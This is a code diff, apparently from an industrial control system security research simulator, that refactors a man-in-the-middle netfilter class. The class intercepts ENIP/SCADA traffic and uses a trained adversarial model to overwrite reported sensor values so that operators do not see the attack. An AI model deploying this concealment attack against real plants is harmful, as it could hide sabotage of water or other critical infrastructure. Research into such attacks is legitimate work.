@@ -18,7 +18,7 @@ from tensorflow.keras.models import *
 from tensorflow.keras import optimizers
 from tensorflow.keras.callbacks import *
 from tensorflow import keras
-
+                                                
 # sklearn
 from sklearn.model_selection import train_test_split
 from sklearn.metrics import mean_squared_error
@@ -72,7 +72,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         self.received_scada_tags_df = self.calculated_concealment_values_df
 
         # set with the tags we have not received in this iteration
-        self.missing_scada_tags = list(self.scada_tags)
+        self.missing_scada_tags = self.scada_tags
 
         self.scada_values = []
         self.scada_session_ids = []
@@ -85,27 +85,31 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         file_expr = 'training_data/ctown/'
 
         # Adversarial model for concealment
-        self.advAE = ConcealmentAE(file_expr)
-
+        self.advAE = ConcealmentAE(self.scada_tags)
+        
         try:
-            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')
+            # For now, only c-town is supported    
+            ctown_model = Path(__file__).parent/'adversarial_models/ctown_generator_100_percent'
+            self.advAE.generator = load_model(str(ctown_model))
+
+            scaler_path = Path(__file__).parent/'adversarial_models/ctown_attacker_scaler.gz'
+            self.advAE.load_scaler(scaler_path)
             self.logger.debug('Trained model found')
 
         except FileNotFoundError:
             self.logger.info('No trained model found, training...')
-            self.advAE.train_model()
+            self.advAE.train_model(file_expr)
             self.logger.info('Model trained')
-            self.advAE.save_model('adversarial_models/generator_100_percent.h5')
+            ctown_model = Path(__file__).parent/'adversarial_models/ctown_generator_100_percent'
+            self.advAE.save_model(ctown_model)
             self.logger.info('Model saved')
-            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')
 
         except IOError:
             self.logger.info('No trained model found, training...')
-            self.advAE.train_model()
+            self.advAE.train_model(file_expr)
             self.logger.info('Model trained')
-            self.advAE.save_model('adversarial_models/generator_100_percent.h5')
+            self.advAE.save_model(ctown_model)
             self.logger.info('Model saved')
-            self.advAE.generator = load_model('adversarial_models/generator_100_percent.h5')
 
         self.sync_flag = True
         self.sync_thread = threading.Thread(target=self.handle_sync)
@@ -136,36 +140,43 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             while not self.get_sync(2):
                 pass
 
-            self.logger.debug('Sync is 2. Keeping attack sync in 2, until we get all SCADA flags')
+            # self.logger.debug('Sync is 2. Keeping attack sync in 2, until we get all SCADA flags')
 
             # We stay in 2, to conceal the values exchanged remotely from the PLCs, until we make a prediction
             while self.missing_scada_tags and self.sync_flag:
                 pass
 
-            self.logger.debug('Setting attack sync in 3')
+            # self.logger.debug('Setting attack sync in 3')
             self.set_sync(3)
 
         self.logger.debug('Netfilter sync thread while finished')
 
     def set_initial_conditions_of_scada_values(self):
-        df = pd.DataFrame(columns=list(self.scada_tags))
+        df = pd.DataFrame(columns=self.scada_tags)
         return df
 
     def get_scada_tags(self):
         aux_scada_tags = []
         for PLC in self.intermediate_yaml['plcs']:
-            if 'sensors' in PLC:
-                aux_scada_tags.extend(PLC['sensors'])
-            if 'actuators' in PLC:
-                aux_scada_tags.extend(PLC['actuators'])
 
-        self.logger.debug('SCADA tags: ' + str(set(aux_scada_tags)))
-        return set(aux_scada_tags)
+            # We were having ordering issues by adding it as a set. Probably could be done in a more pythonic way
+            if 'sensors' in PLC:
+                    for sensor in PLC['sensors']:
+                        if sensor not in aux_scada_tags:
+                            aux_scada_tags.append(sensor)
+                            
+            if 'actuators' in PLC:
+                    for actuator in PLC['actuators']:
+                        if actuator not in aux_scada_tags:
+                            aux_scada_tags.append(actuator)
+
+        # self.logger.debug('SCADA tags: ' + str(aux_scada_tags))
+        return aux_scada_tags
 
     # Delivers a pandas dataframe with ALL SCADA tags
-    def predict_concealment_values(self):
+    def predict_concealment_values(self):        
         self.calculated_concealment_values_df = self.advAE.predict(self.received_scada_tags_df)
-        self.logger.debug('predicting at iteration ' + str(int(self.get_master_clock())))
+        self.logger.debug('predicted at iteration ' + str(int(self.get_master_clock())))
 
     def process_tag_in_missing(self, session, ip_payload):
         current_clock = int(self.get_master_clock())
@@ -173,22 +184,22 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         self.received_scada_tags_df.loc[current_clock, session['tag']] = translate_payload_to_float(
             ip_payload[Raw].load)
         self.missing_scada_tags.remove(session['tag'])
-        self.logger.debug('Missing tags len after removing: ' + str(len(self.missing_scada_tags)))
+        # self.logger.debug('Missing tags len after removing: ' + str(len(self.missing_scada_tags)))
 
     def scada_tag_list_empty(self):
-        self.logger.debug('SCADA set empty')
+        # self.logger.debug('SCADA set empty')
 
         # Wait for sync to take place
         while not self.get_sync(3) and self.sync_flag:
-            self.logger.debug('Waiting for flag 3')
+            # self.logger.debug('Waiting for flag 3')
             pass
 
-        self.missing_scada_tags = list(self.scada_tags)
+        self.missing_scada_tags = self.scada_tags
 
         if self.persistent:
             if self.intermediate_attack['trigger']['start'] <= int(self.get_master_clock()) < \
                     self.intermediate_attack['trigger']['end']:
-                self.logger.debug('Adversarial Model initialized and ready to conceal')
+                # self.logger.debug('Adversarial Model initialized and ready to conceal')
                 self.ok_to_conceal = True
                 if not self.predicted_for_iteration:
                     self.predict_concealment_values()
@@ -211,7 +222,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
     def handle_concealment(self, session, ip_payload):
         if len(self.missing_scada_tags) == len(self.scada_tags):
             # We miss all the tags. Start of a new prediction cycle
-            self.logger.debug('We miss all the tags. Start of a new prediction cycle')
+            # self.logger.debug('We miss all the tags. Start of a new prediction cycle')
             self.predicted_for_iteration = False
 
         if session['tag'] in self.missing_scada_tags:
@@ -243,7 +254,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
             # Concealment values to SCADA
             for session in self.scada_session_ids:
                 if session['session'] == this_session and session['context'] == this_context:
-                    self.logger.debug('Concealing to SCADA: ' + str(this_session))
+                    # self.logger.debug('Concealing to SCADA: ' + str(this_session))
                     return self.handle_concealment(session, ip_payload)
 
         except Exception as exc:
@@ -261,11 +272,11 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:60].split(':')[0]
         context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
-        self.logger.debug('ENIP request for tag: ' + str(tag_name))
+        # self.logger.debug('ENIP request for tag: ' + str(tag_name))
         session_dict = {'session': this_session, 'tag': tag_name, 'context': context}
-        self.logger.debug('session dict: ' + str(session_dict))
+        # self.logger.debug('session dict: ' + str(session_dict))
 
-        self.logger.debug('SCADA Req session')
+        # self.logger.debug('SCADA Req session')
         self.scada_session_ids.append(session_dict)
 
     def capture(self, packet):
@@ -288,10 +299,10 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
                         del p[IP].chksum
                         del p[TCP].chksum
                         packet.set_payload(bytes(p))
+                        # self.logger.debug('Packet modified and accepted')
                     packet.accept()
-                    self.logger.debug('Packet modified and accepted')
+                    # self.logger.debug('Packet accepted')
                     return
-
                 else:
                     if len(p) == 118 or len(p) == 116 or len(p) == 120:
                         self.handle_enip_request(p)
